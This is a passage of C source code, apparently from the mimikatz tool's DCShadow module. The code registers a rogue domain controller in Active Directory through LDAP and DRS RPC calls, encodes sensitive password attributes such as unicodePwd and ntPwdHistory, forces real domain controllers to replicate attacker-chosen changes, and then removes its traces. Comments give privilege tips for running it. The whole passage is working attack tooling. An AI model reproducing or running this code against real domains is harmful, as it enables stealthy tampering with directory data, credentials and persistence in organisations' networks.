	if(*ppReplEnt = (REPLENTINFLIST *) MIDL_user_allocate(sizeof(REPLENTINFLIST)))
	{
		(*ppReplEnt)->pNextEntInf = NULL;
		len = lstrlen(object->szObjectDN);
		if((*ppReplEnt)->Entinf.pName = (DSNAME *) MIDL_user_allocate(sizeof(DSNAME) + len * sizeof(WCHAR)))
		{
			RtlZeroMemory((*ppReplEnt)->Entinf.pName, sizeof(DSNAME));
			(*ppReplEnt)->Entinf.pName->structLen = sizeof(DSNAME) + len * sizeof(WCHAR);
			(*ppReplEnt)->Entinf.pName->NameLen = len;
			RtlCopyMemory((*ppReplEnt)->Entinf.pName->StringName, object->szObjectDN, (len+1)*sizeof(WCHAR));
			if(IsValidSid(&object->pSid))
			{
				(*ppReplEnt)->Entinf.pName->SidLen = GetLengthSid(&object->pSid);
				RtlCopyMemory(&(*ppReplEnt)->Entinf.pName->Sid, &object->pSid, (*ppReplEnt)->Entinf.pName->SidLen);
			}
			RtlCopyMemory(&(*ppReplEnt)->Entinf.pName->Guid, &object->ObjectGUID, sizeof(GUID));
		}
		(*ppReplEnt)->Entinf.ulFlags = ENTINF_FROM_MASTER;
		if (OBJECT_DYNAMIC & object->dwFlag)
			(*ppReplEnt)->Entinf.ulFlags |= ENTINF_DYNAMIC_OBJECT;
		(*ppReplEnt)->Entinf.AttrBlock.attrCount =  object->cbAttributes;
		(*ppReplEnt)->fIsNCPrefix = (_wcsicmp(info->szDomainName, object->szObjectDN) == 0);
		(*ppReplEnt)->pParentGuid = NULL;
		if (!IsNullGuid(&object->ParentGuid) && ((*ppReplEnt)->pParentGuid = (GUID*) MIDL_user_allocate(sizeof(GUID))) != NULL)
		{
			RtlCopyMemory((*ppReplEnt)->pParentGuid, &object->ParentGuid, sizeof(GUID));
		}
		if((*ppReplEnt)->Entinf.AttrBlock.pAttr = (ATTR *) MIDL_user_allocate(sizeof(ATTR) * (*ppReplEnt)->Entinf.AttrBlock.attrCount))
		{
			for(i = 0; i < (*ppReplEnt)->Entinf.AttrBlock.attrCount; i++)
			{
				kull_m_rpc_drsr_MakeAttid(pPrefixTableSrc, object->pAttributes[i].pAttribute->Oid, &(*ppReplEnt)->Entinf.AttrBlock.pAttr[i].attrTyp, TRUE);
				
				(*ppReplEnt)->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal =  object->pAttributes[i].AttrVal.pAVal;
				object->pAttributes[i].AttrVal.pAVal = NULL;
				(*ppReplEnt)->Entinf.AttrBlock.pAttr[i].AttrVal.valCount = object->pAttributes[i].AttrVal.valCount;
			}
		}
		else return FALSE;
		if((*ppReplEnt)->pMetaDataExt = (PROPERTY_META_DATA_EXT_VECTOR *) MIDL_user_allocate(sizeof(PROPERTY_META_DATA_EXT_VECTOR) + (((*ppReplEnt)->Entinf.AttrBlock.attrCount - 1 ) * sizeof(PROPERTY_META_DATA_EXT))))
		{
			(*ppReplEnt)->pMetaDataExt->cNumProps = (*ppReplEnt)->Entinf.AttrBlock.attrCount;
			for(i = 0; i < (*ppReplEnt)->pMetaDataExt->cNumProps; i++)
			{
				(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion = object->pAttributes[i].MetaData.curRevision;
				if(object->pAttributes[i].MetaData.dwFlag & REPLICATION_UID_SET)
					RtlCopyMemory(&(*ppReplEnt)->pMetaDataExt->rgMetaData[i].uuidDsaOriginating, &object->pAttributes[i].MetaData.uidOriginatingDsa, sizeof(GUID));
				else
					RtlCopyMemory(&(*ppReplEnt)->pMetaDataExt->rgMetaData[i].uuidDsaOriginating, &info->realDc.InstanceId, sizeof(GUID));
				if(object->pAttributes[i].MetaData.dwFlag & REPLICATION_USN_SET)
					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].usnOriginating = object->pAttributes[i].MetaData.usnOriginating;
				else
					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].usnOriginating = ++info->maxDCUsn;
				if(object->pAttributes[i].MetaData.dwFlag & REPLICATION_TIME_SET)
					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].timeChanged = (*(PULONGLONG) &object->pAttributes[i].MetaData.usnTimeChanged) / 10000000;
				else
					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].timeChanged = (*(PULONGLONG) pCurrentFt) / 10000000;
				if (!(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion || 
					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].timeChanged <= (DSTIME) (*(PULONGLONG) &object->pAttributes[i].MetaData.curTimeChanged) / 10000000)
					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion++;
			}
		}
		else return FALSE;
		return TRUE;
	}
	return FALSE;
}

BOOL kuhl_m_lsadump_dcshadow_encode_sensitive_value(BOOL fNTLM, DWORD rid, ATTRVAL *val, PSecPkgContext_SessionKey SessionKey)
{
	DWORD i;
	BYTE data[LM_NTLM_HASH_LENGTH];
	BOOL status = FALSE;

	if(fNTLM)
	{
		if(!(val->valLen % LM_NTLM_HASH_LENGTH))
		{
			status = TRUE;
			for(i = 0; (i < val->valLen) && status; i += LM_NTLM_HASH_LENGTH)
			{
				status = NT_SUCCESS(RtlEncryptDES2blocks1DWORD(val->pVal + i, &rid, data));
				if(status)
					RtlCopyMemory(val->pVal + i, data, LM_NTLM_HASH_LENGTH);
				else PRINT_ERROR(L"RtlEncryptDES2blocks1DWORD");
			}
		}
		else PRINT_ERROR(L"Unexpected hash len (%u)\n", val->valLen);
	}
	if(!fNTLM || status)
		status = kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt(val, SessionKey);
	return status;
}

void kuhl_m_lsadump_dcshadow_encode_sensitive(REPLENTINFLIST *pReplEnt,  PDCSHADOW_PUSH_REQUEST_OBJECT object, PSecPkgContext_SessionKey SessionKey)
{
	DWORD i, j;
	BOOL fSupplRidEncryption = FALSE;
	DWORD dwRid = 0;
	PSID pSid = &(object->pSid);
	
	for(i = 0; i < object->cbAttributes; i++)
	{
		if(!object->pAttributes[i].pAttribute->fIsSensitive)
			continue;
		// special case for NTLM password reobfuscated with the RID of the account
		fSupplRidEncryption = (_wcsicmp(object->pAttributes[i].pAttribute->szAttributeName, L"unicodePwd")== 0 ||
					_wcsicmp(object->pAttributes[i].pAttribute->szAttributeName, L"dBCSPwd") == 0 ||
					_wcsicmp(object->pAttributes[i].pAttribute->szAttributeName, L"lmPwdHistory") == 0 ||
					_wcsicmp(object->pAttributes[i].pAttribute->szAttributeName, L"ntPwdHistory") == 0);
		if(fSupplRidEncryption)
			dwRid = *GetSidSubAuthority(pSid, (*GetSidSubAuthorityCount(pSid)) - 1);
		for(j = 0; j < pReplEnt->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; j++)
			kuhl_m_lsadump_dcshadow_encode_sensitive_value(fSupplRidEncryption, dwRid, pReplEnt->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal + j, SessionKey);
	}
}

ULONG kuhl_m_lsadump_dcshadow_call_AddEntry(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs, PDCSHADOW_PUSH_REQUEST_OBJECT pObject)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	DRS_MSG_ADDENTRYREQ msgIn = {0};
	DRS_MSG_ADDENTRYREPLY msgOut = {0};
	DWORD dcOutVersion;
	FILETIME ft = {0};
	DRS_MSG_GETCHGREPLY_V6 reply = {0};
	
	if(kuhl_m_lsadump_dcshadow_object_to_replentinflist(info, &reply.pObjects, pObject, (SCHEMA_PREFIX_TABLE*) &SCHEMA_DEFAULT_PREFIX_TABLE, &ft))
	{
		if (info->dwPushFlags & DOMAIN_INFO_PUSH_REMOTE_MODIFY)
			reply.pObjects->Entinf.ulFlags |= ENTINF_REMOTE_MODIFY;
		RtlCopyMemory(&msgIn.V2.EntInfList.Entinf, &reply.pObjects->Entinf, sizeof(ENTINF));
		RpcTryExcept
		{
			status = IDL_DRSAddEntry(hDrs, 2, &msgIn, &dcOutVersion, &msgOut);
			if(NT_SUCCESS(status))
			{
				if(dcOutVersion == 2)
				{
					status = msgOut.V2.errCode;
					if(status)
						PRINT_ERROR(L"IDL_DRSAddEntry returned 0x%08x\n", status);
				}
				else PRINT_ERROR(L"IDL_DRSAddEntry: unexpected version %u\n", dcOutVersion);
				kull_m_rpc_ms_drsr_FreeDRS_MSG_ADDENTRYREPLY_V2(&msgOut);
			}
			else PRINT_ERROR(L"IDL_DRSAddEntry: 0x%08x\n", status);
			kull_m_rpc_ms_drsr_FreeDRS_MSG_GETCHGREPLY_V6(&reply);
		}
		RpcExcept(RPC_EXCEPTION)
			PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
		RpcEndExcept
	}
	else PRINT_ERROR(L"Encoding object\n");
	return status;
}

ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	DWORD i;
	wchar_t szFunctionalLevel[] = L"0";
	PWSTR pszFunctionalLevel = (PWSTR) &szFunctionalLevel;
	GUID InvocationId;
	wchar_t szInvocationId[2 * sizeof(GUID) + 1];
	PWSTR pszInvocationId = (PWSTR) &szInvocationId;
	PWSTR pszHasMasterNC[] = {info->szDomainNamingContext, info->szConfigurationNamingContext, info->szSchemaNamingContext};
	PWSTR szObjectClassOid = TEXT(szOID_ANSI_nTDSDSA);
	PWSTR szSystemFlags = L"16", szOption = L"0";
	
	DCSHADOW_OBJECT_ATTRIBUTE attributes[] = {
		{NULL, szOID_objectclass,			SYNTAX_OID,				FALSE}, // 0
		{NULL, szOID_hasMasterNCs,			SYNTAX_DN,				FALSE}, // 1
		{NULL, szOID_dMDLocation,			SYNTAX_DN,				FALSE}, // 2
		{NULL, szOID_invocationId,			SYNTAX_OCTET_STRING,	FALSE}, // 3
		{NULL, szOID_options,				SYNTAX_INTEGER,			FALSE}, // 4
		{NULL, szOID_systemFlags,			SYNTAX_INTEGER,			FALSE}, // 5
		{NULL, szOID_serverReference,		SYNTAX_DN,				FALSE}, // 6
		{NULL, szOID_msDS_Behavior_Version,	SYNTAX_INTEGER,			FALSE}, // 7
		{NULL, szOID_msDS_HasDomainNCs,		SYNTAX_DN,				FALSE}, // 8
		{NULL, szOID_msDS_hasMasterNCs,		SYNTAX_DN,				FALSE}, // 9
	};
	DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE values[ARRAYSIZE(attributes)] = {
		{attributes +  0, {0}, {1, NULL}, &szObjectClassOid},
		{attributes +  1, {0}, {3, NULL}, pszHasMasterNC},
		{attributes +  2, {0}, {1, NULL}, &info->szSchemaNamingContext},
		{attributes +  3, {0}, {1, NULL}, &pszInvocationId},
		{attributes +  4, {0}, {1, NULL}, &szOption},
		{attributes +  5, {0}, {1, NULL}, &szSystemFlags},
		{attributes +  6, {0}, {1, NULL}, &info->szFakeDN},
		{attributes +  7, {0}, {1, NULL}, &pszFunctionalLevel},
		{attributes +  8, {0}, {1, NULL}, &info->szDomainNamingContext},
		{attributes +  9, {0}, {3, NULL}, pszHasMasterNC},
	};
	DCSHADOW_PUSH_REQUEST_OBJECT object = {NULL, {0}, {0}, {0}, ARRAYSIZE(values), values, OBJECT_TO_ADD};

	szFunctionalLevel[0] += (WCHAR) info->dwDomainControllerFunctionality;
	UuidCreate(&InvocationId);
	
	for(i = 0; i < sizeof(GUID); i++)
		swprintf_s(szInvocationId + 2 * i, 2 * sizeof(GUID) + 1 - 2 * i, L"%02X", ((PBYTE) &InvocationId)[i]);
	
	if(kull_m_string_sprintf(&object.szObjectDN, L"CN=NTDS Settings,CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
	{
		for(i = 0; i < object.cbAttributes; i++)
			if(!kuhl_m_lsadump_dcshadow_build_replication_value(object.pAttributes + i))
				break;
		if(i == object.cbAttributes)
			status = kuhl_m_lsadump_dcshadow_call_AddEntry(info, hDrs, &object);
	}
	return status;
}

ULONG kuhl_m_lsadump_dcshadow_call_AddEntry_manual(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	DWORD i;
	for(i = 0; i < info->request->cNumObjects; i++)
	{
		if(!NT_SUCCESS(status = kuhl_m_lsadump_dcshadow_call_AddEntry(info, hDrs, info->request->pObjects + i)))
		{
			PRINT_ERROR(L"DRSAddEntry object %u: 0x%08x\n", i, status);
			break;
		}
	}
	return status;
}

typedef ULONG (*kuhl_m_lsadump_dcshadow_bind_DRSR_function) (PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs);
ULONG kuhl_m_lsadump_dcshadow_bind_DRSR(PDCSHADOW_DOMAIN_INFO info, kuhl_m_lsadump_dcshadow_bind_DRSR_function function)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	
	if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", info->szDCFQDN, NULL, L"ldap", TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
	{
		RtlZeroMemory(&DrsExtensionsInt, sizeof(DRS_EXTENSIONS_INT));
		DrsExtensionsInt.cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
		DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
		DrsExtensionsInt.dwReplEpoch = info->dwReplEpoch;
		if(kull_m_rpc_drsr_getDCBind(&hBinding, &(info->realDc.InvocationId), &hDrs, &DrsExtensionsInt))
		{
			status = function(info, hDrs);
			IDL_DRSUnbind(&hDrs);
		}
		kull_m_rpc_deleteBinding(&hBinding);
	}
	else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
	return status;
}

ULONG kuhl_m_lsadump_dcshadow_register_NTDSA(PDCSHADOW_DOMAIN_INFO info)
{
	return kuhl_m_lsadump_dcshadow_bind_DRSR(info, kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry);
}

ULONG kuhl_m_lsadump_dcshadow_AddEntry(PDCSHADOW_DOMAIN_INFO info)
{
	return kuhl_m_lsadump_dcshadow_bind_DRSR(info, kuhl_m_lsadump_dcshadow_call_AddEntry_manual);
}

BOOL kuhl_m_lsadump_dcshadow_register_ldap(PDCSHADOW_DOMAIN_INFO info)
{
	BOOL fSuccess = FALSE;
	DWORD dwErr = 0;
	LDAPMod ldapmodOC = {0};
	LDAPMod ldapmodDNS = {0};
	LDAPMod ldapmodServerReference = {0};
	LDAPMod *ldapmods[] = {&ldapmodOC, &ldapmodDNS, &ldapmodServerReference, NULL};
	PWSTR szDN;
	PWSTR szValsOC[] = {L"server", NULL};
	PWSTR szValsDNS[] = {info->szFakeFQDN, NULL};
	PWSTR szValsServerReference[] = {info->szFakeDN, NULL};
	PWSTR szSPNAttribute[] = {NULL, NULL};
	LDAPMod ldapmodSPN = {0};
	LDAPMod *ldapmodServer[] = {&ldapmodSPN, NULL};
	
	// add computer object
	ldapmodOC.mod_op = LDAP_MOD_ADD;
	ldapmodOC.mod_type = L"objectClass";
	ldapmodOC.mod_vals.modv_strvals = szValsOC;
	ldapmodDNS.mod_op = LDAP_MOD_ADD;
	ldapmodDNS.mod_type = L"dNSHostName";
	ldapmodDNS.mod_vals.modv_strvals = szValsDNS;
	ldapmodServerReference.mod_op = LDAP_MOD_ADD;
	ldapmodServerReference.mod_type = L"serverReference";
	ldapmodServerReference.mod_vals.modv_strvals = szValsServerReference;
	
	ldapmodSPN.mod_op = LDAP_MOD_ADD;
	ldapmodSPN.mod_type = L"servicePrincipalName";
	ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;

	if(kull_m_string_sprintf(&szDN, L"CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
	{
		if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", info->szFakeFQDN, info->szDomainName))
		{
			if(!(dwErr = ldap_add_s(info->ld, szDN, ldapmods)))
			{
				if(!(dwErr = ldap_modify_s(info->ld, info->szFakeDN, ldapmodServer)))
					fSuccess = TRUE;
				else PRINT_ERROR(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr);
			}
			else PRINT_ERROR(L"ldap_add_s computer object 0x%x (%u)\n", dwErr, dwErr);
			LocalFree(szSPNAttribute[0]);
		}
		LocalFree(szDN);
	}
	return fSuccess;
}

NTSTATUS kuhl_m_lsadump_dcshadow_register(PDCSHADOW_DOMAIN_INFO info)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	
	if(!info->mimiDc.isInstanceId)
	{
		if(kuhl_m_lsadump_dcshadow_register_ldap(info))
		{
			if(NT_SUCCESS(kuhl_m_lsadump_dcshadow_register_NTDSA(info)))
			{
				if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szFakeFQDN, &info->mimiDc))
					status = STATUS_SUCCESS;
				else PRINT_ERROR(L"Unable to get invocation Id\n");
			}
			else PRINT_ERROR(L"Unable to add object via Drs\n");
		}
	}
	else
	{
		kprintf(L"Already registered\n");
		status = STATUS_SUCCESS;
	}
	return status;
}

NTSTATUS kuhl_m_lsadump_dcshadow_force_sync_partition(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs, PWSTR szPartition)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ATTRVAL attrVal = {0};
	DRS_MSG_REPADD msgAdd = {0};
	DRS_MSG_REPDEL msgDel = {0};
	PSTR szANSIFakeDCFQDN = kull_m_string_unicode_to_ansi(info->szFakeFQDN);
	
	if(szANSIFakeDCFQDN)
	{
		if(kuhl_m_lsadump_dcshadow_build_replication_value_dn(&attrVal, szPartition))
		{
			msgAdd.V1.pNC = (DSNAME*) attrVal.pVal;
			msgAdd.V1.pszDsaSrc = szANSIFakeDCFQDN;
			msgAdd.V1.ulOptions = DRS_WRIT_REP;
			kprintf(L"Syncing %s\n", szPartition);
			status = IDL_DRSReplicaAdd(hDrs, 1, &msgAdd);
			if(!NT_SUCCESS(status))
				PRINT_ERROR(L"IDL_DRSReplicaAdd %s 0x%x (%u)\n", szPartition, status, status);
			msgDel.V1.pNC = msgAdd.V1.pNC;
			msgDel.V1.pszDsaSrc = msgAdd.V1.pszDsaSrc;
			msgDel.V1.ulOptions = DRS_WRIT_REP;
			status = IDL_DRSReplicaDel(hDrs, 1, &msgDel);
			if(!NT_SUCCESS(status))
				PRINT_ERROR(L"IDL_DRSReplicaDel %s 0x%x (%u)\n", szPartition, status, status);
			kprintf(L"Sync Done\n\n");
			LocalFree(szANSIFakeDCFQDN);
			MIDL_user_free(attrVal.pVal);
		}
	}
	return status;
}

NTSTATUS kuhl_m_lsadump_dcshadow_force_sync(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	
	if(info->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_ROOT)
	{
		status = kuhl_m_lsadump_dcshadow_force_sync_partition(info, hDrs, info->szDomainNamingContext);
		if(!NT_SUCCESS(status))
			return status;
	}
	if(info->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_CONFIG)
	{
		status = kuhl_m_lsadump_dcshadow_force_sync_partition(info, hDrs, info->szConfigurationNamingContext);
		if(!NT_SUCCESS(status))
			return status;
	}
	if(info->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_SCHEMA)
	{
		status = kuhl_m_lsadump_dcshadow_force_sync_partition(info, hDrs, info->szSchemaNamingContext);
		if(!NT_SUCCESS(status))
			return status;
	}
	return status;
}

// start the rpc server, force a sync, and stop the rpc server
NTSTATUS kuhl_m_lsadump_dcshadow_push(PDCSHADOW_DOMAIN_INFO info)
{
	return kuhl_m_lsadump_dcshadow_bind_DRSR(info, kuhl_m_lsadump_dcshadow_force_sync);;
}

NTSTATUS kuhl_m_lsadump_dcshadow_unregister(PDCSHADOW_DOMAIN_INFO info)
{
	BOOL fSuccess = FALSE;
	DWORD dwErr = 0;
	PWSTR sitesBase, sitesFilter, serverBase, NTDSBase;
	LDAPMessage* pSitesMessage, * pServerMessage;
	PWSTR szSPNAttribute[] = {NULL, NULL};
	LDAPMod ldapmodSPN = {0};
	LDAPMod *ldapmodServer[] = {&ldapmodSPN, NULL};
	
	if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", info->szConfigurationNamingContext))
	{
		if(kull_m_string_sprintf(&sitesFilter, L"(&(objectClass=server)(dNSHostName=%s))", info->szFakeFQDN))
		{
			dwErr = ldap_search_sW(info->ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
			if(dwErr == LDAP_SUCCESS)
			{
				if(ldap_count_entries(info->ld, pSitesMessage) == 1)
				{
					if(serverBase = ldap_get_dnW(info->ld, pSitesMessage))
					{
						dwErr = ldap_search_sW(info->ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", NULL, FALSE, &pServerMessage);
						if(dwErr == LDAP_SUCCESS)
						{
							if(NTDSBase = ldap_get_dnW(info->ld, pServerMessage))
							{
								if((dwErr = ldap_delete_s(info->ld, NTDSBase)) != LDAP_SUCCESS)
									PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", NTDSBase, dwErr, dwErr);
								else fSuccess = TRUE;
								ldap_memfreeW(NTDSBase);
							}
							ldap_msgfree(pServerMessage);
						}
						else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
						if((dwErr = ldap_delete_s(info->ld, serverBase)) != LDAP_SUCCESS)
							PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", serverBase, dwErr, dwErr);
						ldap_memfreeW(serverBase);
					}
				}
				else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
				ldap_msgfree(pSitesMessage);
			}
			else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
			LocalFree(sitesFilter);
		}
		LocalFree(sitesBase);
	}

	ldapmodSPN.mod_op = LDAP_MOD_DELETE;
	ldapmodSPN.mod_type = L"servicePrincipalName";
	ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;
	if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", info->szFakeFQDN, info->szDomainName))
	{
		if((dwErr = ldap_modify_s(info->ld, info->szFakeDN, ldapmodServer)) != 0)
			PRINT_ERROR(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr); 
	}
	return (fSuccess?STATUS_SUCCESS: STATUS_UNSUCCESSFUL);
}

VOID kuhl_m_lsadump_dcshadow_init_prefixtable(SCHEMA_PREFIX_TABLE* prefixTable)
{
	DWORD i;
	prefixTable->pPrefixEntry = (PrefixTableEntry*) MIDL_user_allocate(sizeof(PrefixTableEntry) * SCHEMA_DEFAULT_PREFIX_TABLE.PrefixCount);
	if (prefixTable->pPrefixEntry)
	{
		for(i = 0; i < SCHEMA_DEFAULT_PREFIX_TABLE.PrefixCount; i++)
		{
			prefixTable->pPrefixEntry[i].prefix.elements = (PBYTE) MIDL_user_allocate(SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.length);
			if (prefixTable->pPrefixEntry[i].prefix.elements)
			{
				RtlCopyMemory(prefixTable->pPrefixEntry[i].prefix.elements, SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.elements, SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.length);
				prefixTable->pPrefixEntry[i].prefix.length = SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.length;
				prefixTable->pPrefixEntry[i].ndx = SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].ndx;
			}
		}
		prefixTable->PrefixCount = SCHEMA_DEFAULT_PREFIX_TABLE.PrefixCount;
	}
}

// variable used if multiple changes are to be stacked
static DCSHADOW_PUSH_REQUEST stackedRequest = {0};
// used from the rpc server callback - set inside kuhl_m_lsadump_dcshadow
static PDCSHADOW_DOMAIN_INFO pDCShadowDomainInfoInUse = NULL;

BOOL WINAPI kuhl_m_lsadump_dcshadow_control_C(IN DWORD dwCtrlType)
{
	if(pDCShadowDomainInfoInUse && pDCShadowDomainInfoInUse->hGetNCChangeCalled)
		SetEvent(pDCShadowDomainInfoInUse->hGetNCChangeCalled);
	return TRUE;
}

//when run as a server, the RPC middleware uses the process context to decrypt kerberos ticket (not the thread one) else an error 0x80090322 is thrown
//That means that using token::elevate (which changes the thread token) cannot be used to run dcshadow as system
//use !processtoken or psexec -s

// because DCShadow needs domain admin action to trigger the replication, you cannot run both as SYSTEM and domain admin
// that means you need to have 2 processus with different permissions
// (except if the computer account is domain admin)

NTSTATUS kuhl_m_lsadump_dcshadow(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	DCSHADOW_DOMAIN_INFO DCShadowDomainInfo = {0};

	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
	WCHAR szMyComputerNetBios[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwSize = MAX_COMPUTERNAME_LENGTH +1;
	PWSTR szObjectToKill = NULL;
	BOOL fStack = kull_m_string_args_byName(argc, argv, L"stack", NULL, NULL);
	BOOL fViewStack = kull_m_string_args_byName(argc, argv, L"viewstack", NULL, NULL);
	BOOL fClearStack = kull_m_string_args_byName(argc, argv, L"clearstack", NULL, NULL);
	BOOL fPush = kull_m_string_args_byName(argc, argv, L"push", NULL, NULL);
	BOOL fManualRegister = kull_m_string_args_byName(argc, argv, L"manualregister", NULL, NULL);
	BOOL fManualPush = kull_m_string_args_byName(argc, argv, L"manualpush", NULL, NULL);
	BOOL fManualUnregister = kull_m_string_args_byName(argc, argv, L"manualunregister", NULL, NULL);
	BOOL fManualAddEntry = kull_m_string_args_byName(argc, argv, L"addentry", NULL, NULL);
	BOOL fViewReplicationOnly = kull_m_string_args_byName(argc, argv, L"viewreplication", NULL, NULL);
	BOOL fKillViaLingering = kull_m_string_args_byName(argc, argv, L"kill", &szObjectToKill, NULL);
	BOOL fStartServer = fViewReplicationOnly || !(fManualRegister || fManualPush || fManualUnregister || fPush || fManualAddEntry || fKillViaLingering);
	
	LPCWSTR szDomain = NULL;
	
	pDCShadowDomainInfoInUse = &DCShadowDomainInfo;
	pDCShadowDomainInfoInUse->fUseSchemaSignature = FALSE;
	// push options
	if(fPush || fManualPush)
	{
		if(kull_m_string_args_byName(argc, argv, L"config", NULL, NULL))
			pDCShadowDomainInfoInUse->dwPushFlags |= DOMAIN_INFO_PUSH_FLAGS_CONFIG;
		if(kull_m_string_args_byName(argc, argv, L"schema", NULL, NULL))
			pDCShadowDomainInfoInUse->dwPushFlags |= DOMAIN_INFO_PUSH_FLAGS_SCHEMA;
		if(!(pDCShadowDomainInfoInUse->dwPushFlags & (DOMAIN_INFO_PUSH_FLAGS_CONFIG | DOMAIN_INFO_PUSH_FLAGS_SCHEMA)) 
			|| kull_m_string_args_byName(argc, argv, L"root", NULL, NULL))
			pDCShadowDomainInfoInUse->dwPushFlags |= DOMAIN_INFO_PUSH_FLAGS_ROOT;
	}
	// default is current domain
	if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		kull_m_string_copy(&pDCShadowDomainInfoInUse->szDomainName, szDomain);
	else if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
	{
		kull_m_string_copy(&pDCShadowDomainInfoInUse->szDomainName, pPolicyDnsDomainInfo->DnsDomainName.Buffer);
		LsaFreeMemory(pPolicyDnsDomainInfo);
	}

	// DC should be a FQDN because kerberos MUST be used (ip => NTLM) ; else pick any one
	if(!kull_m_string_args_byName(argc, argv, L"dc", &pDCShadowDomainInfoInUse->szDCFQDN, NULL))
	{
		if(!kull_m_net_getDC(pDCShadowDomainInfoInUse->szDomainName, DS_WRITABLE_REQUIRED, &pDCShadowDomainInfoInUse->szDCFQDN))
			return FALSE;
	}
	// must be a FQDN where first part is the netbios name ; default = current computer
	if(!kull_m_string_args_byName(argc, argv, L"computer", &pDCShadowDomainInfoInUse->szFakeDCNetBIOS, NULL))
	{
		GetComputerName(szMyComputerNetBios, &dwSize);
		pDCShadowDomainInfoInUse->szFakeDCNetBIOS = szMyComputerNetBios;
	}
	// do unconnected things
	if(fStack)
	{
		status = kuhl_m_lsadump_dcshadow_encode(&stackedRequest, argc, argv);
	}
	else if(fViewStack)
	{
		status = kuhl_m_lsadump_dcshadow_view(&stackedRequest);
	}
	else if (fClearStack)
	{
		kuhl_m_lsadump_dcshadow_clean_push_request(&stackedRequest);
	}
	else
	{
		// a communication will be done with the target DC
		if ((status = kuhl_m_lsadump_dcshadow_init_ldap(pDCShadowDomainInfoInUse->szDCFQDN, &pDCShadowDomainInfoInUse->ld)) == ERROR_SUCCESS)
		{
			// get the attributes to encode
			if(fStartServer && !fViewReplicationOnly)
				status = kuhl_m_lsadump_dcshadow_encode(&stackedRequest, argc, argv);
			if(NT_SUCCESS(status) && (!fStartServer || (fViewReplicationOnly || stackedRequest.cNumObjects > 0 )))
			{
				if((fStartServer && !fViewReplicationOnly) || fManualAddEntry)
					// reuse stack - will be encoded by kuhl_m_lsadump_dcshadow_domaininfo
					pDCShadowDomainInfoInUse->request = &stackedRequest;
				// collect information needed for further code - this is where attributes are encoded
				if(kuhl_m_lsadump_dcshadow_domain_and_replication_info(pDCShadowDomainInfoInUse))
